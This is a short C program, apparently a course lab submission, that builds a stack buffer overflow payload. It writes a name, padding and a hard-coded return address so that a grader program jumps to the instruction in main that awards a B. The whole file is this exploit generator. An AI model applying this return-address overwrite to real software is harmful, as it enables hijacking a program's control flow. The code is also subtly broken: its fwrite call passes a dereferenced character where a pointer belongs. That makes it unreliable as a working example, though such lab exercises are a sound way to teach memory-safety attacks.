/*--------------------------------------------------------------------*/
/* createdataB.c                                                      */
/* Author: Jonah Johnson, Jeffrey Xu                                  */
/*--------------------------------------------------------------------*/

#include <stdio.h>
#include <stdint.h>

/*
  Produces a file called dataB with the student name, a nullbyte, 
  padding to overrun the stack, and the address of the instruction in
  main to get a B, the latter of which will overwrite getName's stored 
  x30.
*/

/* Writes a file 'dataB' to influence the grader program's behavior and
   get a B. No command-line arguments, stdin reads, or stdout/stderr 
   writes. 
*/
int main(void)
{
    FILE *f = fopen("dataB", "wb");

    /* return error if file can't be opened */
    if (!f) return 1; 

    /* write student name and nullbyte to file */
    char *name = "Jonahjeff";
    fwrite(*name, 1, 9, f);
    fputc(0, f);

    /* writes padding to overrun the stack and go past getName*/
    for (int i = 0; i < 56; i++) {
        fputc('0', f);
    }

    /* writes address of instruction in main to get a B; see memmap */
    unsigned long ulAddr;
    ulAddr = 0x400890;
    fwrite(&ulAddr, sizeof(unsigned long), 1, f);

    fclose(f);

    /* return success */
    return 0;
}